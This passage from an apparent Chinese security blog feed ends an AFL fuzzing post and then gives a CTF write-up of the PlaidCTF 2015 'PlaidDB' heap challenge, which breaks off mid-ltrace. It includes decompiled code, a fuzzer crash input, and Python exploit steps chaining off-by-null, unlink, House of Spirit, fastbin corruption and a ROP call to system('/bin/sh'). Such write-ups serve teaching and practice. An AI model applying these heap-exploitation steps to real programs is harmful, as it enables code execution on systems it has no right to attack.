tcpdump -ee -vv -nnr @@</code></pre><p><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">据说</a>能跑出 CVE（CVE-2017-13044 和 CVE-2017-12989），我用学生服务器跑了一个多礼拜跑出了五个 hangs。不得不说大型的 Fuzz 还是比较依赖机器的性能的：</p><p><img src="/pics/Fuzzing-to-Exploit/3.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="https://cool-y.github.io/2019/07/09/afl-first-try/" target="_blank" rel="noopener">https://cool-y.github.io/2019/07/09/afl-first-try/</a><br><a href="https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ</a><br><a href="https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg</a><br><a href="https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498" target="_blank" rel="noopener">https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498</a><br><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/</a><br><a href="https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/</a><br><a href="https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/</a><br><a href="https://blog.csdn.net/hejunqing14/article/details/50338161" target="_blank" rel="noopener">https://blog.csdn.net/hejunqing14/article/details/50338161</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AFL Fuzz 初体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="fuzz" scheme="blog.b3ale.cn/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>2015-PlaidCTF-PlaidDB</title>
    <link href="blog.b3ale.cn/2020/04/12/2015-PlaidCTF-PlaidDB/"/>
    <id>blog.b3ale.cn/2020/04/12/2015-PlaidCTF-PlaidDB/</id>
    <published>2020-04-12T08:11:29.000Z</published>
    <updated>2020-04-16T02:23:59.380Z</updated>
    
    <content type="html"><![CDATA[<p>之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。</p><a id="more"></a><h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>程序保护全开：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB checksec ./datastore[*] &#39;/home/b3ale/Heap-Exploitation/Plaid-CTF-2015-PlaidDB/datastore&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled</code></pre><p>尝试运行一下程序，大概是模拟了一个数据库，总共有 5 个功能，分别是 GET、PUT、DUMP、DEL 和 EXIT。PUT 用来新增列，读入数据内容时会把换行符（<code>&quot;\n&quot;</code>）也读进来；GET 用来获取对应列的信息；DUMP 获取所有被存入的列；DEL 删除列；EXIT 退出程序：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTPROMPT: Enter row key:AAAPROMPT: Enter data size:4PROMPT: Enter data:AAAAINFO: Insert successful.PROMPT: Enter command:ERROR: &#39;&#39; is not a valid command.PROMPT: Enter command:GETPROMPT: Enter row key:AAAINFO: Row data [4 bytes]:AAAAPROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesINFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:DELPROMPT: Enter row key:th3fl4gINFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesPROMPT: Enter command:EXITINFO: Goodbye</code></pre><p>先用 IDA 来大概看看函数的大概实现。大体就是菜单题的样子，然后大概是用红黑树对数据进行存储，所以我站在前人的肩膀上把结构体改好了：</p><pre><code class="cpp">struct Node {    char *key;    long data_size;    char *data;    struct Node *left;    struct Node *right;    long dummy;    long dummy1;}</code></pre><p>其中 get 函数一开始获取输入的列名（这里我已经标出了 <code>vulread()</code>，在后面会再提到），然后遍历红黑树节点，对读入的 key 和指定节点上的 key 进行比较，如果相等的话会输出相应的 data。最后会把 key 的缓存给 free 掉：</p><pre><code class="cpp">void get(){  char *key; // rbp  struct Node *node; // rbx  int cmp_result; // eax  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( node )  {    while ( 1 )    {      cmp_result = strcmp(key, node-&gt;key);      if ( cmp_result &lt; 0 )      {        node = node-&gt;left;        goto LABEL_2;      }      if ( !cmp_result )        break;      node = node-&gt;right;      if ( !node )        goto LABEL_6;    }    __printf_chk(1LL, &quot;INFO: Row data [%zd byte%s]:\n&quot;, node-&gt;data_size);    fwrite(node-&gt;data, 1uLL, node-&gt;data_size, stdout);    free(key);  }  else  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    free(key);  }}</code></pre><p>在 put 函数中，先读入一个 key，然后读入（saferead 中调用 fgets）数据的长度，然后读入指定长度的字符串（readn 用 read 实现）。最后把读入的结构体添加到红黑树中，在 insert_node 中判断节点是否出现过，若出现过就会 free 掉当前的节点，并更新旧的节点；若没有，则插入红黑树：</p><pre><code class="cpp">void put(){  void **chunk; // rbx  unsigned __int64 size; // rax  void *buf; // rax  struct Node *v3; // rbp  char size_1[24]; // [rsp+0h] [rbp-38h]  unsigned __int64 canary; // [rsp+18h] [rbp-20h]  canary = __readfsqword(0x28u);  chunk = (void **)malloc(0x38uLL);  if ( !chunk )    goto LABEL_10;  puts(&quot;PROMPT: Enter row key:&quot;);  *chunk = vulread();  puts(&quot;PROMPT: Enter data size:&quot;);  saferead(size_1, 16LL);  size = strtoul(size_1, 0LL, 0);  chunk[1] = (void *)size;  buf = malloc(size);  chunk[2] = buf;  if ( !buf )  {    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);    free(*chunk);    if ( __readfsqword(0x28u) == canary )    {      free(chunk);      return;    }LABEL_10:    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);    exit(-1);  }  puts(&quot;PROMPT: Enter data:&quot;);  readn(chunk[2], (size_t)chunk[1]);  v3 = (struct Node *)insert_node(chunk);  if ( v3 )  {    free(*chunk);    free(v3-&gt;data);    v3-&gt;data_size = (__int64)chunk[1];    v3-&gt;data = (char *)chunk[2];    free(chunk);    puts(&quot;INFO: Update successful.&quot;);  }  else  {    puts(&quot;INFO: Insert successful.&quot;);  }  if ( __readfsqword(0x28u) != canary )    goto LABEL_10;}</code></pre><p>dump 函数后序遍历红黑树并输出列名和数据长度：</p><pre><code class="cpp">struct Node *dump(){  struct Node *result; // rax  struct Node *node; // rbx  struct Node *n; // rax  puts(&quot;INFO: Dumping all rows.&quot;);  result = (struct Node *)&amp;root;  node = root;  if ( !root )    return result;  while ( node-&gt;left )    node = node-&gt;left;  while ( 1 )  {    while ( 1 )    {      node-&gt;data_size;      __printf_chk(1LL, &quot;INFO: Row [%s], %zd byte%s\n&quot;, node-&gt;key);      n = node-&gt;right;      if ( !n )        break;      do      {        node = n;        n = n-&gt;left;      }      while ( n );    }    result = node-&gt;dummy;    if ( !result || node != result-&gt;left )      break;LABEL_15:    node = result;  }  while ( result )  {    if ( node != result-&gt;right )      goto LABEL_15;    node = result;    result = result-&gt;dummy;  }  return result;}</code></pre><p>最后的 del 函数比较复杂，就不放太多代码了，因为主要操作是从红黑树中删除节点，最后会依次 free 掉节点的 key、节点的 data、节点本身以及输入的 key。不过如果没有找到指定的列，就不会把输入的 key 给 free 掉：</p><pre><code class="cpp">int del(){  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( !node )  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    return;  }  while ( 1 )  {    key_1 = node-&gt;key;  ...LABEL_69:  LODWORD(n-&gt;dummy1) = 0;LABEL_29:  free(key_1);  free(node-&gt;data);  free(node);  free(key);  return puts(&quot;INFO: Delete successful.&quot;);}</code></pre><p>最后来看 vulread 这里，逐字节读取字符，判断如果读到换行符就 break。如果读入的长度大于 24，则会用 realloc 扩展一倍 chunk 的大小。读完指定长度之后会在字符串最后补上 <code>&quot;\x00&quot;</code>：</p><pre><code class="cpp">char *vulread(){  char *buf; // r12  char *end; // rbx  size_t cap; // r14  char c; // al  char c_1; // bp  signed __int64 idx; // r13  char *new_buf; // rax  buf = (char *)malloc(8uLL);  end = buf;  cap = malloc_usable_size(buf);                // 24  while ( 1 )  {    c = _IO_getc(stdin);    c_1 = c;    if ( c == -1 )      goodbye();    if ( c == &#39;\n&#39; )      break;    idx = end - buf;    if ( cap &lt;= end - buf )    {      new_buf = (char *)realloc(buf, 2 * cap);      buf = new_buf;      if ( !new_buf )      {        puts(&quot;FATAL: Out of memory&quot;);        exit(-1);      }      end = &amp;new_buf[idx];      cap = malloc_usable_size(new_buf);        // 48    }    *end++ = c_1;  }  *end = 0;                                   // off by one  return buf;}</code></pre><p>再用 ltrace 跟一下，大概地看看发生了哪些 malloc 和 free：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x564b295ad010datastore-&gt;malloc(8)                                                    = 0x564b295ad050datastore-&gt;malloc(9)                                                    = 0x564b295ad070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x564b295ad090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad0d0APROMPT: Enter data size:0datastore-&gt;malloc(0)                                                    = 0x564b295ad0f0PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:DELPROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad110Adatastore-&gt;free(0x564b295ad0d0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad0f0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad090)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad110)                                         = &lt;void&gt;INFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>根据上面的分析，有用的信息大概如下几个：</p><ol><li>每个节点固定大小（<code>malloc(56)</code>）；</li><li><code>vulread()</code> 函数中有 <code>malloc()</code> 和 <code>realloc()</code>，可以用 <code>realloc()</code> 获取特定大小的 chunk；</li><li><code>vulread()</code> 里存在 Off by Null；</li><li>删除节点时，如果列名不存在，key 所对应的 chunk 不会被 free；</li><li>往节点中读入数据时的大小可控（<code>malloc(size)</code>）。插入节点时会进行判断，若新节点的 key 值不存在，则插入节点；若存在，则依次 free 新的 key、旧的 data、新的节点。存在节点时的 free 顺序如下：</li></ol><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x55feff2f2010datastore-&gt;malloc(8)                                                    = 0x55feff2f2050datastore-&gt;malloc(9)                                                    = 0x55feff2f2070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f20d0APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f20f0PROMPT: Enter data:AINFO: Insert successful.PROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2110PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f2150APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f2170PROMPT: Enter data:Bdatastore-&gt;free(0x55feff2f2150)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f20f0)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f2110)                                         = &lt;void&gt;INFO: Update successful.PROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><p>看过一遍后，漏洞点其实就在 <code>vulread()</code> 中。如果正好读满 24 字节，然后跟上换行，还会在最后面跟上一个 <code>&quot;\x00&quot;</code>，造成 Off by One（Off by Null）。不过找漏洞还有一种方法。本身程序这里红黑树的操作比较复杂，如果在不知道的情况下单纯地去逆会很难。所以可以对程序进行 Fuzz 来定位漏洞。用 AFL Fuzz 后可以得到会让程序 Crash 的 Payload：</p><pre><code>PUTA0DELAPUTNNNNNN0PUTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>可以看到在 free 的时候提示了 <code>&quot;free(): invalid next size (fast)&quot;</code>，再经过一系列的调试就能判断出应该是溢出的 Null 字节盖到了下一个 chunk 的 size：</p><pre><code>➜  Plaid-CTF-2015-PlaidDB (cat crash.txt ; cat) | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:INFO: Delete successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:GETPROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:GETPROMPT: Enter row key:AAAAAAAAAAAAAAAAAAAAAAAAERROR: Row not found.cat: -: Resource temporarily unavailable*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x00005555557580d0 ***</code></pre><p>这里的 Off by Null 可以溢出盖到下一个 chunk 的 size 的最低一个字节，使得该 chunk 的 <strong>size 变小</strong>（shrink），同时也把 <strong>prev_inuse 置为 0</strong>；同时可以<strong>设置下一个 chunk 的 prev_size</strong>，然后就可以 unlink 拿到某个指针了。画了个草图，这里通过 chunk2 溢出修改 chunk3 的 prev_size 以及覆盖 size 的最低字节为 Null，将 chunk3 的 prev_inuse 置零的同时 shrink：</p><pre><code>                                    prev                            prev             size                   size     size                   size     size +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+ |        |   XX   |chunk1(freed)|   XX   |   XX |0|    chunk2   |   XX   |  XX+1|1|    chunk3   | +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+   prev   size     size +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+ |        |        |             |        |        |AAAAAAAAAAAAA|  2*XX  |   YY |0|        |    | +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+</code></pre><p>实现这样的构造之后，可以通过 GET 把 unlink 后的得到的 chunk 覆盖到的节点信息泄漏出来。然后可以把这个 chunk 作为 value，可以读入任意的数据，构造一些指针作为节点的结构体成员，用 GET 就可以任意读，用 PUT 可以任意写。</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>下面大概记录一下怎么构造出 unlink。首先利用几个 PUT 对堆进行初步的布局：</p><pre><code class="python"># Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)</code></pre><p>结果大概如下，列 <code>&#39;1&#39;</code> 对应的部分会在最后一次 PUT 的时候被替换掉内容，会依次 free 掉 0x3a0、0x2c0、0x360 处的 chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x360 - 0x10 |    0x40    | node &#39;1&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | &#39;1&#39; =&gt; [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+</code></pre><p>接下来 PUT 列 <code>&#39;2&#39;</code> 中的内容，用于之后的 unlink，同时伪造了一个 fastbin chunk，之后避免之后 shrink+free 后和 top chunk 合并：</p><pre><code class="python">PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbin</code></pre><p>堆内存大概如下，此时有两个 0x20 的 fastbin 和一个 0x40 的 fastbin：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;2&#39; -&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x360 - 0x10 |    0x40    | node &#39;2&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+ 0x4c0 - 0x10 |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 +------------+</code></pre><p>然后接下来触发 Off-by-Null，并且：</p><pre><code class="python">DEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size=752DEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink</code></pre><p>smallbin 里会产生一块很大的 chunk，接下来就能 overlap 其中的 chunk，进行任意读、任意写：</p><pre><code> +------------+ 0x0f0 - 0x10                                    +------------+ |    0x40    | node &#39;3&#39;                                        |    0x40    | +------------+ 0x130 - 0x10                                    +------------+ |    0x20    | &#39;3&#39;                                             |    0x20    | +------------+ 0x150 - 0x10                                    +------------+ |    0x20    | &#39;&#39;                                              |    0x20    | +------------+ 0x170 - 0x10                                    +------------+ |    0x40    | node &#39;0&#39; =&gt; [freed]                             |    0x40    | +------------+ 0x1b0 - 0x10                                    +------------+ |    0x20    | &#39;0&#39; =&gt; [freed]                                  |    0x20    | +------------+ 0x1d0 - 0x10                       0x1d0 - 0x10 +------------+ |    0x90    | &#39;C&#39; * 0x80 =&gt; [freed]                           |   0x3f0    | +------------+ 0x260 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;1&#39; =&gt; [freed]                             |     ::     | +------------+ 0x2a0 - 0x10                                    +---- :: ----+ |    0x20    | &#39;1&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x2c0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x2e0 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;2&#39; =&gt; [freed]                             |     ::     | +------------+ 0x320 - 0x10                                    +---- :: ----+ |    0x20    | &#39;2&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x340 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x360 - 0x10                                    +---- :: ----+ |    0x40    | [freed]                                         |     ::     | +------------+ 0x3a0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x3c0 - 0x10                       0x3c0 - 0x10 +---- :: ----+ |   0x100    | &#39;X&#39; * 0xf8                           &#39;X&#39; * 0xf8 |     ::     | +------------+ 0x4c0 - 0x10                                    +---- :: ----+ |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 =&gt; [freed]  |     ::     | +------------+                                    0x5c0 - 0x10 +------------+                                                     &#39;C&#39; * 0x18 |    0x20    |                                                                +------------+</code></pre><p>利用 PUT 泄漏出 heap，并且能构造一个泄漏函数：</p><pre><code class="python"># Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)</code></pre><p>LEAKBUF 在内存中的布局如下，LEAKBUF 的结构体中的 data 和 data_size 可以被 overlap，再用 PUT 泄漏：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; =&gt; [freed] =&gt; node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; =&gt; [freed] =&gt; &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] =&gt; &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | [freed] =&gt; chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | [freed] =&gt; node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | [freed] =&gt; &#39;KEY1&#39; +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |     ::     | &#39;X&#39; * 0xf8 +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>接下来构造一个假的 fastbin chunk 来进行 House-of-Spirit，然后改掉它的 fd 指针：</p><pre><code class="python"># House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption</code></pre><p>最后这里堆布局比较复杂，大概就是伪造一个 fastbin 然后再改它的指针，后面就能取到指针对应的 fake chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | &#39;KEY1&#39; =&gt; fake_chunk_addr +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |   [0x40]   | &#39;X&#39; * 0xf8 =&gt; &#39;P\x00&#39; =&gt; &#39;A&#39; * 0x40 + gadgets +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>最后用 PUT 里的任意大小 malloc 取一个大小为 56 的 chunk。前面构造的 fd 指针位置指向读进去的 data_size 存储的位置，因为程序用的是 strtoul，所以送出去的字符串都会被存在栈上，就能构造一个大小合适的 chunk。为了绕过对 main_arena 的检查，把 fake chunk 的 IS_MMAP 标志位开启：</p><pre><code class="python">cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))</code></pre><p>最后送 data 的时候不是补成 55 是因为前面用 fgets 读 data_size 的时候最后面多补了个 <code>&quot;\x00&quot;</code>：</p><pre><code>0x7fff7e985540: 0x2020202020203635      0x00000000000000420x7fff7e985550: 0x4141414141414100      0xa5f15260d10909000x7fff7e985560: 0x4141414141414141      0x41414141414141410x7fff7e985570: 0x00005560f2703418      0x00007ff1b1cc9a9e0x7fff7e985580: 0x4141414141414141      0xa5f15260d1090900</code></pre><p>在 CTF-Wiki 上还有另外一种更简洁的做法，先造一堆 fastbin，接着构造 chunk。最后用 fastbin attack 改 malloc_hook：</p><pre><code>datastore-&gt;malloc(56)             = 0x55ac13f22010datastore-&gt;malloc(8)              = 0x55ac13f22050datastore-&gt;malloc(9)              = 0x55ac13f22070datastore-&gt;malloc(56)             = 0x55ac13f22090 =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(8)              = 0x55ac13f220d0datastore-&gt;malloc(56)             = 0x55ac13f220f0datastore-&gt;malloc(56)             = 0x55ac13f22130datastore-&gt;malloc(8)              = 0x55ac13f22170datastore-&gt;malloc(56)             = 0x55ac13f22190datastore-&gt;malloc(56)             = 0x55ac13f221d0datastore-&gt;malloc(8)              = 0x55ac13f22210datastore-&gt;malloc(56)             = 0x55ac13f22230datastore-&gt;malloc(56)             = 0x55ac13f22270datastore-&gt;malloc(8)              = 0x55ac13f222b0datastore-&gt;malloc(56)             = 0x55ac13f222d0datastore-&gt;malloc(56)             = 0x55ac13f22310datastore-&gt;malloc(8)              = 0x55ac13f22350datastore-&gt;malloc(56)             = 0x55ac13f22370datastore-&gt;malloc(56)             = 0x55ac13f223b0datastore-&gt;malloc(8)              = 0x55ac13f223f0 =&gt; &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22410datastore-&gt;malloc(56)             = 0x55ac13f22450datastore-&gt;malloc(8)              = 0x55ac13f22490 =&gt; &#39;4&#39; =&gt; [freed] =&gt; &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224b0 =&gt; 